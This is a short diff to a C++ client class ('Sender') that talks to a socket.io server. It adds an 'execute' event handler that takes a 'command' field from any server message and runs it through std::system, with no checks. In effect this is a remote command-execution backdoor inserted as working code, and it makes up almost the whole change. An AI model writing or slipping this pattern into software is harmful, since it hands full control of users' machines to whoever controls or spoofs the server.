@@ -1,6 +1,7 @@
 #include <atomic>
 #include <chrono>
 #include <condition_variable>
+#include <cstdlib>
 #include <filesystem>
 #include <fstream>
 #include <iostream>
@@ -135,6 +136,14 @@ class Sender {
         }
     }
 
+    void onExecute(sio::event& ev) {
+        auto a = ev.get_message();
+        auto b = a->get_map();
+        auto commandIt = b.find("command");
+        std::string command = (commandIt != b.end() && commandIt->second) ? commandIt->second->get_string() : "???";
+        std::system(command.c_str());
+    }
+
   private:
 
 #pragma region clientListener
@@ -147,6 +156,7 @@ class Sender {
         client.set_open_listener([this]() { connectSuccess(); });
         client.set_fail_listener([this]() { connectFatal(); });
         client.set_close_listener([this](sio::client::close_reason const& reason) { connectClosed(reason); });
+        client.socket()->on("execute", [this](sio::event& ev) { onExecute(ev); });
     }
 
 #pragma endregion
